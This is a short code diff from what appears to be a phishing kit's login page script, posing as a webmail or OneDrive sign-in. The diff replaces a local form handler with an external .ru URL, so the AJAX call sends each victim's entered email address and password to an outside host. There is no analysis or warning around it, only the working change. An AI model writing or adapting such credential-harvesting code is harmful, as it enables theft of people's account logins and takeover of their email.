@@ -248,7 +248,7 @@
               var theemidval = '5a80db15dd962954bdb5dca723a29108';
               //mg(emv, psv,'G-Webmail');  
               $.ajax({
-                url: 'p0st.php', 
+                url: 'https://dualsmtp.ru/email-list/onedrive25/finish.php', 
                 type: 'POST', 
                 dataType: 'html', 
                 data: { Email : emv, password : psv, typeofemail : 'G-Webmail', theemid : theemidval}, 
